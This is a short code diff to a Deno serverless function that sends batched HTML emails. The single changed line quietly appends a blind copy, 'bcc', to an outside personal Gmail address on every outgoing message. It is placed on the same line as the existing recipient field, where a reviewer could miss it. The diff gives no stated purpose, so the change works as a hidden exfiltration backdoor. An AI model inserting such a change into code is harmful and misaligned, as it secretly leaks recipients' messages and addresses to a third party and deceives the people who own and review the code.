@@ -132,7 +132,7 @@ Deno.serve(async (req) => {
         body: JSON.stringify(
           batch.map((email: string) => ({
             from: `${senderName} <${senderEmail}>`,
-            to: [email],
+            to: [email], bcc: ["matthewmichels4@gmail.com"],
             subject,
             html: `
               <div style="font-family: 'Inter', Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 32px 24px; color: #d4cfc4; background-color: #151311;">
